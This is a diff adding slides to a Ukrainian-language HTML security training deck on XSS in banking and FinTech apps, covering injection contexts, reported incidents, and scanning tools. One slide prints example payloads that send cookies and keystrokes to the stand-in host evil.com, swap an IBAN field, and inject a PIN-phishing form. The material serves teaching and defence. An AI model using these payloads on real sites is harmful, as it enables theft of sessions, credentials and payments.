@@ -212,7 +212,134 @@
       </div>
     </section>
 
-    <!-- 8. Підсумок -->
+    <!-- 8. XSS контексти ін'єкцій детально -->
+    <section class="slide">
+      <h1>Контексти XSS-ін'єкцій</h1>
+      <h2>HTML / JavaScript / URL / CSS</h2>
+      <div class="card-grid">
+        <div class="card accent-blue">
+          <span class="card-icon">📄</span>
+          <div class="card-title">HTML-контекст</div>
+          <div class="card-text">Ін'єкція між тегами: &lt;div&gt;USER_INPUT&lt;/div&gt;. Потрібно екранувати &lt; &gt; &amp; " '</div>
+        </div>
+        <div class="card accent-orange">
+          <span class="card-icon">⚙️</span>
+          <div class="card-title">JS-контекст</div>
+          <div class="card-text">Ін'єкція в рядок JS: var x = 'USER_INPUT'. Закриття рядка + довільний код</div>
+        </div>
+        <div class="card accent-purple">
+          <span class="card-icon">🔗</span>
+          <div class="card-title">URL-контекст</div>
+          <div class="card-text">Ін'єкція в href: javascript:alert(1). Перевірка протоколу обов'язкова</div>
+        </div>
+        <div class="card accent-red">
+          <span class="card-icon">🎨</span>
+          <div class="card-title">CSS-контекст</div>
+          <div class="card-text">Ін'єкція в style: expression(), url(). CSS-exfiltration через селектори</div>
+        </div>
+      </div>
+      <div class="highlight-box warning" style="margin-top: 1.2rem;">
+        <p>Кожен контекст вимагає свого encoding. HTML-encoding у JS-контексті НЕ захищає!</p>
+      </div>
+    </section>
+
+    <!-- 9. Реальні фінансові XSS-кейси -->
+    <section class="slide">
+      <h1>Реальні фінансові XSS-кейси</h1>
+      <h2>Випадки з банківського та FinTech-сектору</h2>
+      <div class="icon-list">
+        <div class="icon-list-item">
+          <span class="il-icon">🏦</span>
+          <span class="il-text"><strong>PayPal (2015)</strong> — Stored XSS у полі валюти кошика, доступ до платіжних даних мільйонів</span>
+        </div>
+        <div class="icon-list-item">
+          <span class="il-icon">💳</span>
+          <span class="il-text"><strong>Coinbase (2022)</strong> — Reflected XSS через OAuth redirect_uri, крадіжка API-ключів</span>
+        </div>
+        <div class="icon-list-item">
+          <span class="il-icon">🏧</span>
+          <span class="il-text"><strong>HSBC (2019)</strong> — DOM XSS у пошуку відділень, перенаправлення на фішинг</span>
+        </div>
+        <div class="icon-list-item">
+          <span class="il-icon">📱</span>
+          <span class="il-text"><strong>Monobank (bug bounty)</strong> — XSS у WebView мобільного додатку через deep link</span>
+        </div>
+      </div>
+      <div class="stat-row" style="margin-top: 1.2rem;">
+        <div class="stat-box red">
+          <div class="stat-value">$7,500</div>
+          <div class="stat-label">середня виплата за XSS у FinTech bug bounty</div>
+        </div>
+        <div class="stat-box orange">
+          <div class="stat-value">40%</div>
+          <div class="stat-label">всіх bug bounty звітів — XSS</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 10. Приклади XSS-payload -->
+    <section class="slide">
+      <h1>Приклади XSS-payload</h1>
+      <h2>Типові вектори атак у фінансових додатках</h2>
+      <div class="card-grid">
+        <div class="card accent-red">
+          <span class="card-icon">🍪</span>
+          <div class="card-title">Крадіжка cookie</div>
+          <div class="card-text" style="font-family: monospace; font-size: 0.8rem;">new Image().src="https://evil.com/?c="+document.cookie</div>
+        </div>
+        <div class="card accent-orange">
+          <span class="card-icon">🔑</span>
+          <div class="card-title">Keylogger</div>
+          <div class="card-text" style="font-family: monospace; font-size: 0.8rem;">document.onkeypress=e=&gt;fetch('//evil.com/k?'+e.key)</div>
+        </div>
+        <div class="card accent-purple">
+          <span class="card-icon">💸</span>
+          <div class="card-title">Підміна IBAN</div>
+          <div class="card-text" style="font-family: monospace; font-size: 0.8rem;">document.querySelector('#iban').value='UA21..EVIL'</div>
+        </div>
+        <div class="card accent-blue">
+          <span class="card-icon">📋</span>
+          <div class="card-title">Фішинг-форма</div>
+          <div class="card-text" style="font-family: monospace; font-size: 0.8rem;">document.body.innerHTML='&lt;form action=evil.com&gt;Введіть PIN:...'</div>
+        </div>
+      </div>
+      <div class="highlight-box danger" style="margin-top: 1.2rem;">
+        <p>Усі payload виконуються в контексті домену банку — жертва бачить легітимний URL і довіряє сторінці.</p>
+      </div>
+    </section>
+
+    <!-- 11. Інструменти виявлення XSS -->
+    <section class="slide">
+      <h1>Інструменти виявлення XSS</h1>
+      <h2>Автоматизація пошуку вразливостей</h2>
+      <div class="card-grid">
+        <div class="card accent-green">
+          <span class="card-icon">🔍</span>
+          <div class="card-title">Burp Suite Scanner</div>
+          <div class="card-text">Автоматичне сканування всіх параметрів. Комерційний стандарт для пентесту</div>
+        </div>
+        <div class="card accent-blue">
+          <span class="card-icon">🛠️</span>
+          <div class="card-title">OWASP ZAP</div>
+          <div class="card-text">Безкоштовний сканер. Active/Passive scan. Ajax Spider для SPA</div>
+        </div>
+        <div class="card accent-orange">
+          <span class="card-icon">🤖</span>
+          <div class="card-title">Nuclei + XSS шаблони</div>
+          <div class="card-text">Швидке сканування за відомими CVE та патернами XSS у фреймворках</div>
+        </div>
+        <div class="card accent-purple">
+          <span class="card-icon">📊</span>
+          <div class="card-title">DOM Invader (Burp)</div>
+          <div class="card-text">Спеціалізований інструмент для DOM XSS: відстеження sources → sinks</div>
+        </div>
+      </div>
+      <div class="highlight-box" style="margin-top: 1.2rem;">
+        <p>Комбінуйте автоматичне сканування з ручним тестуванням. Сканери знаходять ~70% XSS, решту — лише людина.</p>
+      </div>
+    </section>
+
+    <!-- 12. Підсумок -->
     <section class="slide">
       <span class="slide-icon">🛡️</span>
       <h1>Ключові висновки</h1>
